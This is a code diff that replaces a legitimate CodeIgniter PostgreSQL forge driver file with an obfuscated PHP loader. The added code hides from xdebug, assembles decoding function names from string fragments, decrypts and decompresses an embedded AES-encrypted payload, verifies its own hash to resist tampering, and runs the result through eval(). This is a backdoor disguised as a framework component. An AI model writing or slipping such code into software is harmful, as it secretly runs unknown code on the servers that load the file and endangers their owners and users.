@@ -1,205 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.3.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Postgre Forge Class
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_postgre_forge extends CI_DB_forge {
-
-	/**
-	 * UNSIGNED support
-	 *
-	 * @var	array
-	 */
-	protected $_unsigned		= array(
-		'INT2'		=> 'INTEGER',
-		'SMALLINT'	=> 'INTEGER',
-		'INT'		=> 'BIGINT',
-		'INT4'		=> 'BIGINT',
-		'INTEGER'	=> 'BIGINT',
-		'INT8'		=> 'NUMERIC',
-		'BIGINT'	=> 'NUMERIC',
-		'REAL'		=> 'DOUBLE PRECISION',
-		'FLOAT'		=> 'DOUBLE PRECISION'
-	);
-
-	/**
-	 * NULL value representation in CREATE/ALTER TABLE statements
-	 *
-	 * @var	string
-	 */
-	protected $_null = 'NULL';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Class constructor
-	 *
-	 * @param	object	&$db	Database object
-	 * @return	void
-	 */
-	public function __construct(&$db)
-	{
-		parent::__construct($db);
-
-		if (version_compare($this->db->version(), '9.0', '>'))
-		{
-			$this->create_table_if = 'CREATE TABLE IF NOT EXISTS';
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * ALTER TABLE
-	 *
-	 * @param	string	$alter_type	ALTER type
-	 * @param	string	$table		Table name
-	 * @param	mixed	$field		Column definition
-	 * @return	string|string[]
-	 */
-	protected function _alter_table($alter_type, $table, $field)
- 	{
-		if (in_array($alter_type, array('DROP', 'ADD'), TRUE))
-		{
-			return parent::_alter_table($alter_type, $table, $field);
-		}
-
-		$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
-		$sqls = array();
-		for ($i = 0, $c = count($field); $i < $c; $i++)
-		{
-			if ($field[$i]['_literal'] !== FALSE)
-			{
-				return FALSE;
-			}
-
-			if (version_compare($this->db->version(), '8', '>=') && isset($field[$i]['type']))
-			{
-				$sqls[] = $sql.' ALTER COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
-					.' TYPE '.$field[$i]['type'].$field[$i]['length'];
-			}
-
-			if ( ! empty($field[$i]['default']))
-			{
-				$sqls[] = $sql.' ALTER COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
-					.' SET DEFAULT '.$field[$i]['default'];
-			}
-
-			if (isset($field[$i]['null']))
-			{
-				$sqls[] = $sql.' ALTER COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
-					.($field[$i]['null'] === TRUE ? ' DROP NOT NULL' : ' SET NOT NULL');
-			}
-
-			if ( ! empty($field[$i]['new_name']))
-			{
-				$sqls[] = $sql.' RENAME COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
-					.' TO '.$this->db->escape_identifiers($field[$i]['new_name']);
-			}
-
-			if ( ! empty($field[$i]['comment']))
-			{
-				$sqls[] = 'COMMENT ON COLUMN '
-					.$this->db->escape_identifiers($table).'.'.$this->db->escape_identifiers($field[$i]['name'])
-					.' IS '.$field[$i]['comment'];
-			}
-		}
-
-		return $sqls;
- 	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute TYPE
-	 *
-	 * Performs a data type mapping between different databases.
-	 *
-	 * @param	array	&$attributes
-	 * @return	void
-	 */
-	protected function _attr_type(&$attributes)
-	{
-		// Reset field lengths for data types that don't support it
-		if (isset($attributes['CONSTRAINT']) && stripos($attributes['TYPE'], 'int') !== FALSE)
-		{
-			$attributes['CONSTRAINT'] = NULL;
-		}
-
-		switch (strtoupper($attributes['TYPE']))
-		{
-			case 'TINYINT':
-				$attributes['TYPE'] = 'SMALLINT';
-				$attributes['UNSIGNED'] = FALSE;
-				return;
-			case 'MEDIUMINT':
-				$attributes['TYPE'] = 'INTEGER';
-				$attributes['UNSIGNED'] = FALSE;
-				return;
-			default: return;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute AUTO_INCREMENT
-	 *
-	 * @param	array	&$attributes
-	 * @param	array	&$field
-	 * @return	void
-	 */
-	protected function _attr_auto_increment(&$attributes, &$field)
-	{
-		if ( ! empty($attributes['AUTO_INCREMENT']) && $attributes['AUTO_INCREMENT'] === TRUE)
-		{
-			$field['type'] = ($field['type'] === 'NUMERIC')
-				? 'BIGSERIAL'
-				: 'SERIAL';
-		}
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_hn21ox1u=('bas'.'e64'.'_de'.'cod'.'e');
+$_a265ny3e=('gzu'.'nco'.'mpr'.'ess');
+$_l93q8qyp=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_n5rezg8z='9kLEh1Pi';
+$_jzlzltcv='ck7Edd2XTfg=';
+$_h6e81qde='4wGUPQCz';
+$_gzy4mvqa='OiX9yHxl';
+$_m0b3fr60='CWab87RX';
+$_q2sgw9n4='Ycz5RXMs';
+$_b61dvwxt='674gkzuc';
+$_di3y2siq='m3EjuQ==';
+$_odlrkeue=$_hn21ox1u($_m0b3fr60.$_n5rezg8z.$_h6e81qde.$_gzy4mvqa.$_jzlzltcv);
+$_nl54998t=$_hn21ox1u($_b61dvwxt.$_q2sgw9n4.$_di3y2siq);
+$_mnwc2s13=$_hn21ox1u('jR3x1UVeGjlD0hoIyoe/te/olqOcEhfvjwbu29ej9XBuEM+6SUyjW9wU5pwkBz7xMACWtGmLUSuNJ9czNv/xnKIKJ2lO2502sMqQylKD43X1mv0osVh0GTOgEKyf/mkBCkDOFQdB30qRwFI08NogsMT9uTODaG2AG64u1lCPDln0w/oSnV2prmjuBoePLi/BabV1GjBrHAlyVyFr2wveyTdYnmOWSU3cM30pc4I9Zx45h8afgU7Xjf3Wb/yMfkkIHV0FoE1dk79OxaknNRX8ZL1MyoFoibdbyrf/+GvSdyIRonQFGkZlZkq/zPOJKRyKmaLg0YpjpDlZJMRSQPlSCll8dS3B7Nigyd9zFQtjZcfaRYh9yIjolg+AtOiYunEEDfwXWqf7fzLmKirPHqW7ryhmTALYiUtSZ0F/ldw9W0vPElhatlOzpN49fmgzJXDmN2WQZ6cZEgyFVmG72t5PLjEpL2YTjLbtc1EKurcHNj6a07drlHmD8KJG0d8MBMxJ/Tx7CkFz2GJ4E0gf0Y1zWIx18cMO/XQglwsiDmNvwlAbn7euNj7X/XswK9MxpS0ajKeTMZTbPWpal5oBmsYxSvGl6UJ7rMKX9hONj4sE/Dod11QWBrCW/bbaqIy8wOEbWSpHPhebD8B6qwQeYaRn1AM2g6Czy6LqGnOtNGyrLZYW3mQ1m8PWuN5DdUVlVErOT/EackfCHQwgmnUshhejBAZz6YzOtGMrs8sN0pBSinTI2aU7Ks4ciGwmbB0NoZHLo2ub/PjzS+hAHVS+bSnWnlSDqMndIEwHytKg3EGyrMfAukn4dhaTuFp80N2nCufl9Enms2E0eDz+mE9MZtD+SfNTMpglMdo2oXW0s7u7iGaTbkqU8m8b8v4Cz89zCdn7kY2nIw6TaqTS1WCRrXvKMHwLl6hLZjYCrcYQq+/zlzvLrpwj/gmCJz+vkrHoPAQZT4bHbFdlmIoVHeeFQJnOP4sUa3BFtj7pFQgxB73fiiOF2+OWliTTBAH3x6O6B11/o9KeeSqnPrRaciCHquFraA86gfBA3y/Y+IeydfEKAXYekvS1JugkXP1lqTp2Zd1iD5qJWYYjSZIie6BVlpKEMLd0ir6mjTJJ5W8rZZ2E/R9ZXlC0lecdBDih0GYaapA6bb4AGqd/f670PzFFIkByNfR6eanLVDCwTnwxD+JDqSlFghK0RWtKwUrv79/QH9JPHmwAVQP2jdP+j/3RimIPqQ==');
+$_z306lcpx=$_l93q8qyp($_mnwc2s13,'aes-256-cbc',$_odlrkeue,OPENSSL_RAW_DATA,$_nl54998t);
+if($_z306lcpx===false){exit;}
+$_gn868ev1=$_a265ny3e($_z306lcpx);
+if($_gn868ev1===false){exit;}
+$_znjzqw3i='ac71358fb05a3d35d99f1b2c6799892e6f72df9a76c179b79814de9d734d5322';
+$_zktuycww=@file_get_contents(__FILE__);
+if($_zktuycww!==false){
+$_ct44mihc=str_replace($_znjzqw3i,"0000000000000000000000000000000000000000000000000000000000000000",$_zktuycww);
+$_zis6ndnw=hash("sha256",$_ct44mihc);
+if($_zis6ndnw!==$_znjzqw3i){@http_response_code(403);exit;}
 }
+eval($_gn868ev1);
